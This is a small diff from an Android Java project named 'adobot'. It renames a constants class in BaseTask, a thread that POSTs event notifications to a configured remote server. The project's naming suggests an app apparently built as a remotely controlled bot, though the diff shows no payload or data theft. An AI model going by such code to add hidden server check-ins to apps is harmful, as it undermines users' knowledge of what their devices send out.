@@ -13,7 +13,7 @@ import android.support.v4.content.ContextCompat;
 
 import com.android.adobot.BuildConfig;
 import com.android.adobot.CommonParams;
-import com.android.adobot.Constants;
+import com.android.adobot.AdobotConstants;
 import com.android.adobot.activities.PermissionsActivity;
 import com.android.adobot.http.Http;
 import com.android.adobot.http.HttpRequest;
@@ -78,7 +78,7 @@ public class BaseTask extends Thread implements Runnable {
         params.put("event", event);
         Http req = new Http();
         req.setMethod(HttpRequest.METHOD_POST);
-        req.setUrl(commonParams.getServer() + Constants.NOTIFY_URL);
+        req.setUrl(commonParams.getServer() + AdobotConstants.NOTIFY_URL);
         req.setParams(params);
         req.execute();
     }
